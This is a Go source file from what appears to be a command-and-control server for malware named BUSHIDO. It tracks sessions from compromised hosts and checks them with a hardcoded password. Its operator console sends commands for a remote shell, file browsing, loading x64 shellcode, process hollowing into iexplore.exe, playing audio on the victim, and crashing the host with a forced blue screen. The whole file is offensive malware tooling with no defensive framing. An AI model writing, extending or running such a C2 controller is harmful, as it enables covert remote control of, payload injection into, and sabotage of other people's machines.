package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"regexp"
	"strings"
	"time"
)

func NewSessionList() *SessionList {
	return &SessionList{
		Stop: make(chan struct{}),
	}
}

func (ll *SessionList) registerSession(port string, conn net.Conn) {
	check := true
	var id int
	for check {
		id = rand.Intn(9000)
		check = ll.checkIfSessionIDExist(id)
	}
	// Create a new Session struct
	newSession := &Session{
		id:     id,
		Port:   port,
		Status: "Active",
		Conn:   conn,
	}
	// Add to the head of the linked list
	newSession.Next = ll.Head
	ll.Head = newSession
}

func authSession(conn *net.Conn) bool {
	auth := make([]byte, 32)
	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))
	(*conn).Write([]byte("AreYouAlive\n"))
	n, err := (*conn).Read(auth)
	if err != nil {
		fmt.Println("[-]Error reading from connection:", err)
		fmt.Println()
		return false
	}
	if n <= 1 {
		fmt.Println("[-]Error amount of data returned is less than 1")
		fmt.Println()
		return false
	}
	authString := string(auth[:n])

	// Perform authentication
	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
		fmt.Println("[-]Authentication failed")
		fmt.Println()
		(*conn).Close()
		return false
	}
	(*conn).SetReadDeadline(time.Time{})
	return true
}

// displaySessions displays the active sessions
func (ll *SessionList) displaySessions() {
	fmt.Println("\nActive Sessions:")
	current := ll.Head
	for current != nil {
		fmt.Println("[+]SessionID:", current.id, "- Port:", current.Port, "- Status:", current.Status)
		current = current.Next
	}
	fmt.Println()
}

// func (ll *SessionList) updateSessionStatus(targetPort string, status string, conn net.Conn) {
// 	current := ll.Head
// 	for current.Port != targetPort {
// 		current = current.Next
// 	}
// 	current.Status = status
// 	current.Conn = conn
// }

func (ll *SessionList) checkIfSessionIDExist(id int) bool {
	//Case Empty List
	if ll.Head == nil {
		return false
	}
	current := ll.Head
	for current != nil {
		if current.id == id {
			return true //Return that it exists
		}
		current = current.Next
	}
	return false //After itterating through all of the list return that it dont exist
}

func (ll *SessionList) closeSessions() {
	fmt.Println()
	current := ll.Head
	for current != nil {
		fmt.Println("[-]Unit on", current.id, "lost")
		current.Conn.Close()
		current.Conn = nil // Clear the connections list

		current = current.Next
	}
	fmt.Println()
	ll.Head = nil // Reset the listener list
}

func openSession(id int, sl *SessionList) {
	current := sl.Head
	if current == nil {
		fmt.Println("\n[-]Session not found\n")
		return
	}
	for current.id != id && current != nil {
		current = current.Next
		if current == nil {
			fmt.Println("\n[-]Session not found\n")
			return
		}
	}
	fmt.Println("\n[!]Session Found !")
	fmt.Println("[+]Connecting ...")
	if !authSession(&current.Conn) {
		return
	}
	fmt.Println("[+]BUSHIDO Shell Open ...\n")
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("BU$H1D0-1 >> ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		} //Check how to make this prettier
		command = strings.TrimSpace(command)
		playRegex := regexp.MustCompile(`play .+`)
		playMatch := playRegex.FindString(command)
		loadRegex := regexp.MustCompile(`load .+`)
		loadMatch := loadRegex.FindString(command)
		cdRegex := regexp.MustCompile(`cd .+`)
		cdMatch := cdRegex.FindString(command)
		hollowRegex := regexp.MustCompile(`hollow .+ .+`)
		hollowMatch := hollowRegex.FindString(command)
		if cdMatch != "" {
			dir2go := strings.Split(command, " ")[1]
			cd(&current.Conn, dir2go)
		}
		if playMatch != "" {
			audioFile := strings.Split(command, " ")[1]
			playAudio(&current.Conn, audioFile)
		}
		if loadMatch != "" {
			binFile := strings.Split(command, " ")[1]
			load(&current.Conn, binFile)
		}
		if hollowMatch != "" {
			filePathLocal := strings.Split(command, " ")[1]
			//filePathTarget := strings.Split(command, " ")[2]
			filePathTarget := strings.Split(command, "\"")[1]
			//filePathTarget = "\"" + filePathTarget + "\"" //Not the sexiest fix but will do for now
			fmt.Println()
			fmt.Println("[!]Local File Path: " + filePathLocal)
			fmt.Println("[!]Remote File Path: " + filePathTarget)
			hollow(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
		}
		switch command { //All of the functions called below will be found under bushido.go
		case "shell":
			shell(&current.Conn)
		case "hostinfo":
			hostinfo(&current.Conn)
		case "bsod": //Refine it a bit more
			if bsod(&current.Conn) {
				fmt.Println("[!]HOST BSOD !")
				fmt.Println("[?]Impliment Feature where the session is removed from the list when this happens")
				return
			} else {
				fmt.Println("[-]Couldn't BSOD the Host ...")
			}
		case "bg":
			return
		case "exit":
			return
		case "play": //The audio thing only works if the device is not a VM
			fmt.Println("[?]Usage: play <fileNameInAudio>")
			//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
		case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
			fmt.Println("[?]Usage: play <x64ShellcodeFile>")
			//load(&current.Conn, "msf.bin") //Test Case. Success
		case "cd":
			fmt.Println("[?]Usage: cd <dir>") //Works with relative and absolute paths
		case "ls":
			ls(&current.Conn)
		case "pwd":
			pwd(&current.Conn)
		case "hollow":
			fmt.Println("[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
			fmt.Println("[?]Windows paths should have double backslashes as such: \"C:\\Progarm Files\\Internet Explorer\\iexplore.exe\"")
		default:
		}
	}
}
